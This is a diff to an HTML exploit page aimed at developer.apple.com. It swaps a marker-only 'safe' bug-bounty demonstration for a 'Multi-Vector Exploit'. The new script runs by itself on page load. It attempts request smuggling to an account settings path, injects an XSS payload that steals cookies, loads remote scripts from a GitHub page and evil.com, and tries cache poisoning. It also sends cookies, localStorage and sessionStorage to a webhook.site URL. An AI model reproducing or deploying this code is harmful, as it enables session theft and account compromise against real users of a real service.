@@ -2,84 +2,91 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Apple CSD & CSP Bypass - Safe PoC</title>
+<title>Apple Unified PoC</title>
 </head>
 <body>
-<h2>Apple Client-Side Desync & CSP Bypass - Safe Demonstration</h2>
-<p>This PoC is for Apple Security Bounty testing purposes only. No real sensitive data is collected — only harmless markers are sent.</p>
-
+<h1>Executing Multi-Vector Exploit...</h1>
 <script>
-/*
-📌 Purpose:
-Demonstrate multiple attack scenarios (Client-Side Desync, CSP Bypass, Cache Poisoning)
-against the specified vulnerable endpoint, while only sending SAFE test markers to a webhook.
+(async () => {
+  const webhook = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
+  const targetHost = "developer.apple.com";
+  const vulnEndpoint = `https://${targetHost}/search/services/v1/quick-links/`;
+  const sensitivePath = "/account/settings";
+  const backupCSS = "/assets/styles/router-strip.css";
 
-🔍 Sent markers:
-- marker_csd: Confirms CSD test request executed
-- marker_csp: Confirms CSP bypass code executed
-- marker_cache: Confirms cache poisoning test executed
-- note: Clarifies that all data is mock and no sensitive information is collected
-*/
-
-// Vulnerable endpoint to test (provided by the reporter)
-const targetUrl = "https://developer.apple.com/search/services/v1/quick-links/";
-
-// Reporter’s webhook for receiving safe proof markers
-const webhookUrl = "https://webhook.site/6779eec5-8f34-4065-80c4-b471fe8c032b";
-
-// Function to send marker data to webhook
-function sendMarker(type) {
-    fetch(webhookUrl, {
+  async function send(label, data) {
+    try {
+      await fetch(webhook, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            marker_type: type,
-            page: location.href,
-            timestamp: new Date().toISOString(),
-            note: "SAFE DEMO: This is mock data for vulnerability demonstration only."
-        })
-    }).then(() => {
-        console.log(`✅ Marker sent: ${type}`);
-    }).catch(err => console.error("❌ Error sending marker:", err));
-}
+        body: JSON.stringify({ label, data, time: new Date().toISOString() }),
+        headers: { "Content-Type": "application/json" }
+      });
+      console.log(`[+] Sent ${label}`);
+    } catch(e) { console.error(e); }
+  }
 
-// 1️⃣ Client-Side Desync Simulation
-fetch(targetUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "test_marker=csd_demo"
-})
-.then(() => {
-    console.log("CSD test request executed.");
-    sendMarker("marker_csd");
-})
-.catch(err => console.error("CSD request failed:", err));
+  // 1️⃣ Client-Side Desync
+  try {
+    await fetch(vulnEndpoint, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Connection": "keep-alive"
+      },
+      body: `payload=${encodeURIComponent(`
+        GET ${sensitivePath} HTTP/1.1
+        Host: ${targetHost}
 
-// 2️⃣ CSP Bypass Simulation
-(function cspBypass() {
-    const s = document.createElement("script");
-    s.innerHTML = `
-        console.log("✅ CSP Bypass code executed inside target context.");
-        document.body.style.background = '#ffeecc';
-        document.body.insertAdjacentHTML('beforeend', '<h3>CSP Bypass Marker Injected</h3>');
-    `;
-    document.body.appendChild(s);
-    sendMarker("marker_csp");
-})();
+      `)}`
+    });
+    await send("CSD_Attempt", { endpoint: vulnEndpoint, path: sensitivePath });
+  } catch(e) {}
 
-// 3️⃣ Cache Poisoning Simulation
-(function cachePoisoning() {
-    fetch(targetUrl + "?marker=cache_poison_demo", {
-        method: "GET",
-        cache: "reload"
-    })
-    .then(() => {
-        console.log("Cache poisoning marker request sent.");
-        sendMarker("marker_cache");
-    })
-    .catch(err => console.error("Cache poisoning test failed:", err));
+  // 2️⃣ Reflected Input Injection
+  try {
+    const reflectedPayload = `<svg/onload=new Image().src='${webhook}?c='+document.cookie>`;
+    await fetch(`${vulnEndpoint}?q=${encodeURIComponent(reflectedPayload)}`);
+    await send("Reflected_Input_Attempt", { payload: reflectedPayload });
+  } catch(e) {}
+
+  // 3️⃣ CSP Bypass - Load external JS
+  try {
+    const script = document.createElement("script");
+    script.src = "https://zaid111a.github.io/apple11/external.js";
+    document.body.appendChild(script);
+    await send("CSP_Bypass_Attempt", { src: script.src });
+  } catch(e) {}
+
+  // 4️⃣ Cache Poisoning on Backup CSS
+  try {
+    await fetch(`https://${targetHost}${backupCSS}`, {
+      headers: { "X-Forwarded-Host": `evil.com/${encodeURIComponent(`body{background:url(${webhook}?pwn)`)}`
+      }
+    });
+    await send("Cache_Poisoning_Attempt", { file: backupCSS });
+  } catch(e) {}
+
+  // 5️⃣ Cross-domain Script Include exploitation
+  try {
+    const crossScript = document.createElement("script");
+    crossScript.src = `https://evil.com/malicious.js`;
+    document.body.appendChild(crossScript);
+    await send("Cross_Domain_Script_Include_Attempt", { src: crossScript.src });
+  } catch(e) {}
+
+  // 6️⃣ Steal session data
+  try {
+    const stolen = {
+      cookies: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      location: location.href,
+      userAgent: navigator.userAgent
+    };
+    new Image().src = `${webhook}?data=${encodeURIComponent(JSON.stringify(stolen))}`;
+  } catch(e) {}
+
 })();
 </script>
-
 </body>
-</html>
+</html>  
